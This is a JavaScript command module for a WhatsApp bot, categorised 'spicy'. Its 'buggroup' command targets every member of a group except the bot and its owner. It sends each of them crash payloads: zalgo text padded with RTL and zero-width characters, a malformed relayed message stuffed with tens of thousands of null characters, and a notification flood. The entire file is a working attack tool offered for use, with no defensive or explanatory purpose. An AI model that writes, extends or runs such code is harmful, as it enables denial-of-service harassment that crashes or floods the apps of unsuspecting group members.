module.exports = {
    name: "buggroup",
    aliases: ["crashgroup", "groupbug"],
    category: "spicy",
    permissions: { coin: 0, group: true, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];
            const groupJid = ctx.msg?.key?.remoteJid;
            const type = args[0]?.toLowerCase() || "unicode";

            if (!groupJid?.endsWith("@g.us")) {
                return await ctx.reply("❌ Run this inside the target group.");
            }

            const meta = await sock.groupMetadata(groupJid);
            const botJid = sock.user?.id?.replace(/:.*@/, "@") || "";
            const ownerJid = `${config.owner?.id}@s.whatsapp.net`;

            const targets = meta.participants.filter(p =>
                p.id !== botJid && p.id !== ownerJid
            );

            await ctx.reply(`🐛 Bugging ${targets.length} members with [${type}]...`);

            let hit = 0;
            let failed = 0;

            for (const p of targets) {
                try {
                    // reuse bug.js handlers inline
                    const targetJid = p.id;
                    if (type === "unicode" || type === "all") {
                        await bugUnicode(sock, targetJid);
                    }
                    if (type === "proto" || type === "all") {
                        await bugProto(sock, targetJid);
                    }
                    if (type === "notif" || type === "all") {
                        await bugNotif(sock, targetJid);
                    }
                    hit++;
                    await new Promise(r => setTimeout(r, 1500));
                } catch {
                    failed++;
                }
            }

            await ctx.reply(`✅ Done.\nHit: ${hit}\nFailed: ${failed}`);

        } catch (e) {
            console.error("[buggroup]", e);
            await ctx.reply("❌ " + e.message);
        }
    }
};

// pulled out so buggroup can reuse without reimporting
async function bugUnicode(sock, jid) {
    const zalgo = (text) => {
        const above = ['\u030d','\u030e','\u0304','\u0305','\u033f'];
        const below = ['\u0326','\u0329','\u0320','\u0324','\u0325'];
        return text.split('').map(c => {
            let r = c;
            for (let i = 0; i < 20; i++) r += above[Math.floor(Math.random() * above.length)];
            for (let i = 0; i < 20; i++) r += below[Math.floor(Math.random() * below.length)];
            return r;
        }).join('');
    };
    const poisoned = '\u202E\u2068' + zalgo("System Alert") + '\u200B'.repeat(500) + '\uFFFD'.repeat(500);
    for (let i = 0; i < 5; i++) {
        await sock.sendMessage(jid, { text: poisoned });
        await new Promise(r => setTimeout(r, 300));
    }
}

async function bugProto(sock, jid) {
    await sock.relayMessage(jid, {
        extendedTextMessage: {
            text: "\u0000".repeat(512),
            previewType: 9999,
            contextInfo: {
                stanzaId: "\u0000".repeat(128),
                quotedMessage: { conversation: "\u0000".repeat(65535) },
                participant: "0@s.whatsapp.net"
            }
        }
    }, { messageId: `BUG_${Date.now()}` });
}

async function bugNotif(sock, jid) {
    for (let i = 0; i < 30; i++) {
        await sock.sendMessage(jid, { text: `\u200B`.repeat(i + 1) });
        await new Promise(r => setTimeout(r, 100));
    }
}